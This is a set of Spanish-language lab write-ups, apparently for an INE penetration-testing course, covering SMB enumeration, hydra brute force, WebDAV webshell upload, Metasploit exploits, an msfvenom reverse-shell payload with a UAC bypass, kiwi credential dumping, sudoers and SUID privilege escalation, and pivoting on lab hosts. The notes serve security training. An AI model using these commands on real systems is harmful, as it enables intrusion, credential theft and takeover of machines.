# resolucion de laboratorios

### information gathering

* descargandonos la pagina mediante httrack podemos acceder a un archivo que contenia una flag
* mediante nmap podiamos recuperar otra flag
* en la raiz de worpress habia un archivo wp.config.bak que nos daba otra flag
* en el robots.txt había otra flag
* otra flag fue encontrada mediante dirb listando los directorios, uno de ellos con un directory listing tenia otra flag

### windows recon: nmap host discovery

simplemente haciendo el siguiente comando nos dejaba reconocer todos los puertos

```
nmap -Pn <dominio>  
```

### scan the server 1

enumearción de smb con nmap

sin credenciales válidas

```
nmap -p445 --script smb-protocols demo.ine.local

```

```
nmap -p445 --script smb-security-mode demo.ine.local
```

```
nmap -p445 --script smb-enum-sessions demo.ine.local
```

```
nmap -p445 --script smb-enum-shares demo.ine.local
```

con credenciales válidas:

```
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

### scan the server 2

enumeración de Bind DNS, TFTP, and SNMP servers.

```
nmap -sU -p1-250 demo.ine.local
```

nos da el 134,177,234

pero escaneando los version de los servicios no nos da ninguna información acerca del 134 con lo cual asume que es un tftp

```
nmap demo.ine.local -p 134,177,234 -sUV
```

```
tftp demo.ine.local 134
```

### network service scanning

nos dan dos objetivos, pero uno de ellos solo es accesible mediante uno de los objetivos tenemous que hacer para ello routing con metasploit

hacemos el scan de puertos con metasploit del objetivo

```
use /auxiliary/scanner/portscan/tcp
```

posteriormente hacemos explotamos la vulnerabiliadad xoda vile upload

```
exploit/unix/webapp/xoda_file_upload
```

una vez dentro con meterpreter nos hacemos una bash para listar el ifconfig

posteriormente para hacer el autoroute podemos hacer (dentro de meterpreter)

```
run autoroute -s <ip nueva interfaz de la maquina explotada> 
```

```
background 
```

una vez este hecho el autorouting ya podemos hacer un escaner de los puertos a la nueva subred en este caso podemos hacer

```
use /auxiliary/scanner/portscan/tcp
```

y setrhost a la nueva ip que ya nos dejará escanear sin problema



### **Assessment Methodologies: Enumeration CTF 1**

\
![](<../../.gitbook/assets/image (4).png>)

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

despues de probar multitud de comandos solo nos da como acertado el siguiente&#x20;



```
smbclient //192.242.216.3/ipc$ -U alice
```

pero no nos permite listar nada del contenido que hay dentro de ese directorio&#x20;



hay un puerto que permite el ftp por el puerto 5554 y que al intentar conectarnos nos revela nombres de usuario y nos dice que tienen contraseñas debiles, por lo que hacemos un diccionario de usuarios con los que nos da y usuamos hyudra para averiguar la contraseña, lo que nos da la tercera falg

```
hydra -L  users2.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ftp://target.ine.local -s 5554
```

hay que tener muyyy en cuenta que nos daba un shares.txt dentro de nuestro escritorio y podiamos hacer un scriopt para enumerar los usuarios con smbclient de la siguietne manera



```bash
while read share; do
    smbclient //target.ine.local/$share -N -c 'ls' 2>/dev/null && echo "[+] Share encontrado: $share"
done < shares.txt

```

este era el diccionario de los  shares que nos daba:&#x20;



```bash
publicdata
communitydata
openstorage
freestorage
accessiblestorage
pubstorage
commonstorage
publicarchive
sharedarchive
commonarchive
pubarchive
opendocs
freedocs
communitydocs
accessibledocs
commondocs
pubdocs
publicfiles
openfiles
freefiles
sharedfiles
accessiblefiles
communityfiles
commonsfiles
pubfiles
openvault
freevault
accessiblevault
publicvault
commonvault
openlibrary
pubvault
freelibrary
accessiblelibrary
worldstoragebin
universalstoragebin
sharedstoragebin
collectivestoragebin
mutualstoragebin
globalarchivebin
worldarchivebin
universalarchivebin
```

y pubfiles nos daba login correcto con sesión nula y ya hemos finalizado el laboratorio



### **Windows: IIS Server DAVTest**

tenemos una web http://demo.ine.local el cual contiene un webdav&#x20;

con davteset analizamos que archivos es posible subir y cuales de ellos se pueden ejecutar

```bash
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
```

y con cadaver subimos el archivo el cual nos pone que es posible ejecutar

```
cadaver http://demo.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
```

en la shell que nos proporciona hacemos:

dir C:\\

encontramos la flag y con type la leemos<br>

### **Windows: IIS Server: WebDav Metasploit**

```bash
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
set httpusername <username>
set httppassword <password>
set rhosts <ip>
set PATH /<webdav>/metasploit.asp
```

### **Windows: SMB Server PSexec**

en primer lugar he tirado un enum4linux para ver los usuarios, donde hemos visto que uno de los usuarios era administrator y con smb\_login el modulo de metasploit hemos conseguido la contraseña para el mismo y posteriormente con psexec hemos conseguido una sesion de meterpreter para el mismo como el usuario nt authority system

```bash
use windows/smb/psexec
```

### Windows: Insecure RDP Service

nos encontramos un puerto 3333 que no parece rdp pero que si lanzamos el scanner de metasploit nos da exitoso:

```bash
scanner/rdp/rdp_scanner

```

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
```

```bash
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333

```

importante: he fallado en el comando xfreerdp porque no he indicado el puerto. Además en el comando de hydra no he puesto el common\_users.txt y me estabaa dando error

### WinRM: Exploitation with Metasploit

```bash
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

importante tener en cuenta poner password en anything porque no me dejaba sino, me daba error, y con password en anything ya coge el PASS\_FILE que contiene todas las contraseñas



### UAC Bypass: UACMe&#x20;



importante este modulo en el que he tenido varios problemas.&#x20;

en primer lugar miramos que habia un servidor web httpFileserver 2.3 vulnerable:&#x20;



```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit

##Posteriormente migramos al proceso de explorer.exe
ps -S explorer.exe
migrate 2332

# hacemos getsystem pero fallará
# creamos un payload con msfvenom para elevar nuestros privilegios 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > 'backdoor.exe'
# nos ponemos en escucha con el multi/handler por la misma ip y puerto que hemos especificado en el payload anterior
# importante que debe ser EXACTAMENTE el mismo payload 
# si lo haces con revshells.com cuidado con el /x64/ 

shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

esto ya nos da otra meterpreter  pero no tenemos NT AUTHORITHY  aún, debemos migrar a lsass

```bash
ps -S lsass.exe
migrate <pid>
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Importante que el ntlm hash es esa parte del hash.



### **Windows: Meterpreter: Kiwi Extension**



**Lo unico a destacar es el exploit utilizado**&#x20;



```bash
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
```

y posteriormente que te daba la opcion de migrar directamente a un proceso NT AUTHORITY

```bash
migrate -N lsass.exe
pgrep lsass.exe
```

podiamos listar todas las credenciales que nos pedía con la extension kiwi

```bash
load kiwi
lsa_dump_sam
lsa_dump_secrets
hashdump
```

### **ProFTP Recon: Basics**

<br>

1. What is the version of FTP server?
   1. ProFTPD 1.3.5a
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common\_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt to check if any of these credentials work on the system. List all found credentials.
   1. \[21]\[ftp] host: demo.ine.local login: sysadmin password: 654321      \
      \[21]\[ftp] host: demo.ine.local login: rooty password: qwerty      \
      \[21]\[ftp] host: demo.ine.local login: demo password: butterfly      \
      \[21]\[ftp] host: demo.ine.local login: auditor password: chocolate      \
      \[21]\[ftp] host: demo.ine.local login: anon password: purple      \
      \[21]\[ftp] host: demo.ine.local login: administrator password: tweety      \
      \[21]\[ftp] host: demo.ine.local login: diag password: tigger
3. Find the password of user “sysadmin” using nmap script.
4. Find seven flags hidden on the server.

### **Samba Recon: Dictionary Attack**

1. What is the password of user “jane” required to access share “jane”? Use smb\_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix\_passwords.txt
   1. abc123
2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
   1. password1
3. Which share is read only? Use smbmap with credentials obtained in question 2.
   1. nancy
4. Is share “jane” browseable? Use credentials obtained from the 1st question.
   1. yes&#x20;
5. Fetch the flag from share “admin”
   1. 2727069bc058053bd561ce372721c92e
6. List the named pipes available over SMB on the samba server? Use pipe\_auditor metasploit module with credentials obtained from question 2.
   1. \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
7.  List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

    1. S-1-22-2-1000 Unix Group\admins (Domain Group)\
       S-1-22-2-1001 Unix Group\Maintainer (Domain Group)       \
       S-1-22-2-1002 Unix Group\Reserved (Domain Group)       \
       S-1-22-2-1003 Unix Group\Testing (Domain Group



```bash
enum4linux -r -u admin -p password1 -S demo.ine.local
```

### &#x20;**Cron Jobs Gone Wild II**

\
tenemos un archivo file llamado message en /home del student, con lo cual podemos pensar que hay una tarea cron que esta copiando ese archivo desde nuestro home a tmp.

podemos pensar que el archivo es copiado a tmp mediante cp /home hacia tmp con lo cual mediante el comando tmp podemos observar este comportamiento&#x20;

```bash
grep -nri "/tmp/message" /usr
```

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Este comando se debe utilizar debido a que no tenemos ningun tipo de editor como nano o vim.

tenemos un archivo copy.sh para el cual tenemos permisos de escritura y si ponemos el comando podemos cambiar los permisos para studen y poner que podemos hacer cualquier comando sin proporcionar contraseñas&#x20;

haciendo su root ganeremos permisos de superusuario para el archivo&#x20;



### **Exploiting Setuid Programs**

\
hay un programa welcome que tiene permisos suid y haciendo strings vemos que llama a otro programa que tambien esta en nuestro directorio home

```bash
cp /bin/bash greetings
```

copiando el binario /bin/bash y llamandolo greetings y posteriormente ejecutando el comando welcome nos da root



### Password Cracker: Linux



creamos el hash.txt siguiente:

TODA LA LINEA DEL HASHDUMP

```
root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
```

```
gunzip rockyou.txt.gz
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

esto nos da la contraseña password para el usuario root



### **NetBIOS Hacking**&#x20;

```bash
nmap -p445 --script smb-enum-users.nse demo.ine.local
## admin, administrator, root, and guest
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

```
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

```
run autoroute -s <SegundaIp>/20
background
use auxiliary/server/socks_proxy
show options

set SRVPORT 9050
set VERSION 4a 
exploit
jobs

```

```
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

```
sessions -i 1
shell
net view 10.0.28.125

CTRL + C
migrate -N explorer.exe
shell
net view 10.0.28.125
```

```
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
```

```
dir D:
dir K:
CTRL + C
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
```

### Pivoting&#x20;



```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo1.ine.local
run
```

<pre class="language-bash"><code class="lang-bash">meterpreter > ipconfig
meterpreter > run autoroute -s 10.0.19.0/20
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
sessions -i 1
<strong>meterpreter > portfwd add -l 1234 -p 80 -r &#x3C;IP Address of demo2.ine.local>
</strong>portfwd list
</code></pre>

```bash
nmap -sV -sS -p 1234 localhost
searchsploit badblue 2.7
msfconsole -q
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
```

### **Host & Network Penetration Testing: System-Host Based Attacks CTF 1**

### <br>

la web tenia un basic auth por lo que hemos tirado de hydra&#x20;

```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local  http-get /
```

despues con dirb proporcionando credenciales hemos encontrado el webdav

```
dirb http://target1.ine.local -u bob:password_123321
```

```
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav
cadaver http://target1.ine.local/webdav
```

en el segundo target simplement con smb\_login de metasploit con fuerza bruta

administrator:pineapple
